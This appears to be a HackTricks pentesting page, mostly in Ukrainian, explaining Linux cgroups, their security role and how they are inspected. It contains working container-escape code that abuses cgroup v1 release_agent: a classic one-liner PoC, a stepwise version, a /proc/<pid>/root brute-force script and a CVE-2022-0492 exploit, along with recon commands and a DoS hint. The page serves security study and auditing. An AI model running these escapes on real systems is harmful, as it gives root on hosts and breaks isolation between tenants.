# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **control groups** — це механізм ядра, який використовується для групування процесів для обліку, обмеження, пріоритезації та застосування політик. Якщо namespaces переважно про ізоляцію вигляду ресурсів, то cgroups здебільшого про те, щоб керувати **скільки** цих ресурсів набір процесів може спожити і, в деяких випадках, **з якими класами ресурсів** вони взагалі можуть взаємодіяти. Контейнери постійно покладаються на cgroups, навіть коли користувач ніколи не дивиться на них безпосередньо, бо майже кожен сучасний runtime потребує способу сказати ядру "ці процеси належать до цього навантаження, і ось правила використання ресурсів, що до них застосовуються".

Ось чому container engines поміщають новий контейнер у власне cgroup піддерево. Коли дерево процесів знаходиться там, runtime може обмежити пам'ять, лімітувати кількість PIDs, встановити ваги використанню CPU, регулювати I/O та обмежувати доступ до пристроїв. В production-середовищі це необхідно як для безпеки з кількома орендаторами, так і для простої операційної гігієни. Контейнер без адекватних контролів ресурсів може вичерпати пам'ять, затопити систему процесами або монополізувати CPU і I/O так, що хост або сусідні навантаження стануть нестабільними.

З погляду безпеки, cgroups важливі в двох окремих аспектах. По-перше, погані або відсутні ліміти ресурсів дозволяють прості атаки відмови в обслуговуванні. По-друге, деякі функції cgroup, особливо в старіших налаштуваннях **cgroup v1**, історично давали потужні примітиви для виходу з контейнера, коли вони були записувані зсередини контейнера.

## v1 проти v2

Існує два основні моделі cgroup в природі. **cgroup v1** відкриває кілька ієрархій контролерів, і старі описи експлойтів часто крутяться навколо дивних і іноді надто потужних семантик, доступних там. **cgroup v2** вводить більш уніфіковану ієрархію та загалом чистішу поведінку. Сучасні дистрибутиви дедалі частіше віддають перевагу cgroup v2, але змішані або застарілі середовища все ще існують, що означає — обидві моделі залишаються релевантними при огляді реальних систем.

Ця різниця важлива, бо деякі з найвідоміших історій про вихід з контейнера, такі як зловживання **`release_agent`** у cgroup v1, дуже конкретно пов'язані зі старою поведінкою cgroup. Читач, який бачить експлойт cgroup у блозі і потім сліпо застосовує його до сучасної системи тільки з cgroup v2, ймовірно, неправильно зрозуміє, що насправді можливо на цілі.

## Inspection

The quickest way to see where your current shell sits is:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` файл показує шляхи cgroup, пов'язані з поточним процесом. На сучасному хості з cgroup v2 ви часто побачите єдиний запис. На старіших або гібридних хостах може відображатися кілька шляхів контролерів v1. Як тільки ви дізнаєтесь шлях, ви можете перевірити відповідні файли в `/sys/fs/cgroup`, щоб побачити обмеження та поточне використання.

На хості з cgroup v2 корисні такі команди:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ці файли показують, які контролери існують і які з них делеговано дочірнім cgroups. Ця модель делегування має значення в rootless та systemd-managed середовищах, де runtime може контролювати лише ту підмножину функціональності cgroup, яку фактично делегує батьківська ієрархія.

## Лабораторна вправа

Один зі способів спостерігати cgroups на практиці — запустити контейнер з обмеженням пам'яті:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Ви також можете спробувати контейнер з обмеженням PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ці приклади корисні, бо допомагають зв’язати runtime flag з файловим інтерфейсом ядра. Runtime не застосовує правило магічно; він записує відповідні налаштування cgroups і потім дозволяє ядру застосувати їх до дерева процесів.

## Runtime Usage

Docker, Podman, containerd, і CRI-O всі покладаються на cgroups у звичайній роботі. Різниця зазвичай не в тому, чи вони використовують cgroups, а в тому, **які значення за замовчуванням вони обирають**, **як вони взаємодіють із systemd**, **як працює делегування у rootless-сценаріях**, і **наскільки конфігурація контролюється на рівні engine проти рівня оркестрації**.

У Kubernetes запити ресурсів і ліміти зрештою перетворюються на конфігурацію cgroup на вузлі. Шлях від Pod YAML до застосування правила ядром проходить через kubelet, CRI runtime і OCI runtime, але cgroups залишаються механізмом ядра, який остаточно застосовує правило. В середовищах Incus/LXC cgroups також широко використовуються, особливо тому, що системні контейнери часто відкривають більш багате дерево процесів і очікування, подібні до VM.

## Misconfigurations And Breakouts

Класична історія безпеки cgroup — це механізм записуваного **cgroup v1 `release_agent`**. У цій моделі, якщо атакуючий може записувати в потрібні файли cgroup, увімкнути `notify_on_release`, і контролювати шлях, збережений у `release_agent`, ядро може виконати вибраний атакуючим шлях у initial namespaces на хості, коли cgroup стане порожньою. Саме тому старі матеріали приділяли велику увагу можливості запису в контролери cgroup, опціям монтування та умовам namespace/capability.

Навіть коли `release_agent` недоступний, помилки в cgroup все одно мають значення. Надто широкі права доступу до пристроїв можуть зробити пристрої хоста доступними з контейнера. Відсутні обмеження пам'яті та PID можуть перетворити просте виконання коду на DoS хоста. Слабке делегування cgroup у rootless-сценаріях також може вводити в оману захисників, змушуючи їх вважати, що обмеження існує, тоді як runtime фактично ніколи не зміг його застосувати.

### `release_agent` Background

Техніка `release_agent` застосовується лише до **cgroup v1**. Основна ідея в тому, що коли останній процес у cgroup завершується і встановлено `notify_on_release=1`, ядро виконує програму, шлях до якої збережено в `release_agent`. Це виконання відбувається в **initial namespaces на хості**, що перетворює записуваний `release_agent` на примітив для виходу з контейнера.

Для того, щоб техніка спрацювала, атакуючому зазвичай потрібні:

- записувана **cgroup v1** ієрархія
- можливість створити або використовувати дочірню cgroup
- можливість встановити `notify_on_release`
- можливість записати шлях у `release_agent`
- шлях, який з точки зору хоста відповідає виконуваному файлу

### Classic PoC

Історичний однорядковий PoC такий:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
This PoC записує шлях до payload у `release_agent`, ініціює звільнення cgroup і потім читає згенерований на хості файл виводу.

### Зрозуміле покрокове пояснення

Цю ж ідею легше зрозуміти, якщо розбити її на кроки.

1. Створіть і підготуйте cgroup, доступну для запису:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Визначте шлях на хості, який відповідає файловій системі контейнера:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Скинути payload, який буде видимим у host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Спровокувати виконання, зробивши cgroup порожньою:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Наслідком є виконання payload на стороні хоста з привілеями root. У реальному exploit payload зазвичай записує файл підтвердження, запускає reverse shell або змінює стан хоста.

### Варіант відносного шляху з використанням `/proc/<pid>/root`

У деяких середовищах шлях на хості до файлової системи контейнера неочевидний або прихований драйвером зберігання. У такому разі шлях payload можна задати через `/proc/<pid>/root/...`, де `<pid>` — це host PID, що належить процесу в поточному контейнері. Це і є основа варіанту brute-force для відносних шляхів:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Релевантний трюк тут — не сам brute force, а форма шляху: `/proc/<pid>/root/...` дозволяє ядру отримувати доступ до файлу всередині файлової системи контейнера з простору імен хоста, навіть коли прямий шлях до сховища хоста наперед невідомий.

### CVE-2022-0492 Варіант

У 2022 році CVE-2022-0492 показала, що запис у `release_agent` в cgroup v1 неправильно перевіряв наявність `CAP_SYS_ADMIN` в **початковому** просторі імен користувача. Це зробило техніку набагато доступнішою на вразливих ядрах, оскільки процес у контейнері, який міг змонтувати ієрархію cgroup, міг записати в `release_agent` без попередніх привілеїв у просторі імен користувача хоста.

Мінімальний експлойт:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
На вразливому ядрі host виконує `/proc/self/exe` з привілеями host root.

Для практичного зловживання почніть із перевірки, чи середовище все ще відкриває записувані шляхи cgroup-v1 або небезпечний доступ до пристроїв:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Якщо `release_agent` присутній і доступний для запису, ви вже в зоні legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Якщо сам шлях cgroup не дає escape, наступне практичне використання часто — denial of service або reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ці команди швидко покажуть, чи має робоче навантаження можливість виконати fork-bomb, агресивно споживати пам'ять або зловживати записуваним legacy cgroup interface.

## Checks

Під час розгляду цілі мета перевірок cgroup — дізнатися, яка модель cgroup використовується, чи бачить контейнер контролерні шляхи, доступні для запису, і чи старі примітиви для втечі, такі як `release_agent`, взагалі релевантні.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Що тут цікаво:

- Якщо `mount | grep cgroup` показує **cgroup v1**, старіші breakout writeups стають більш релевантними.
- Якщо `release_agent` існує і до нього можна дістатися, це одразу варте більш глибокого розслідування.
- Якщо видима ієрархія cgroup доступна для запису, а контейнер також має сильні capabilities, середовище заслуговує набагато ретельнішого огляду.

Якщо ви виявите **cgroup v1**, змонтовані контролери з правом запису та контейнер, який має сильні capabilities або слабкий захист seccomp/AppArmor, така комбінація потребує уважної уваги. cgroups часто вважають нудною темою управління ресурсами, але історично вони були частиною одних з найпоказовіших container escape chains саме тому, що межа між «контролем ресурсів» і «впливом на хост» не завжди була такою чистою, як вважали.

## Параметри середовища виконання за замовчуванням

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Типові ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Контейнери автоматично поміщаються в cgroups; обмеження ресурсів опційні, якщо не вказані через прапорці | пропуск `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods і контейнери поміщаються в cgroups через runtime вузла; тонке керування ресурсами залежить від `resources.requests` / `resources.limits` | пропуск `resources.requests`/`resources.limits`, привілейований доступ до пристроїв, неправильна конфігурація runtime на рівні хоста |
| containerd / CRI-O | Enabled by default | cgroups є частиною нормального керування життєвим циклом | прямі runtime-конфіги, що послаблюють контроль пристроїв або відкривають legacy writable cgroup v1 інтерфейси |

Важлива відмінність полягає в тому, що **cgroup existence** зазвичай присутня за замовчуванням, тоді як **корисні обмеження ресурсів** часто є опціональними, якщо їх явно не налаштовано.
{{#include ../../../../banners/hacktricks-training.md}}
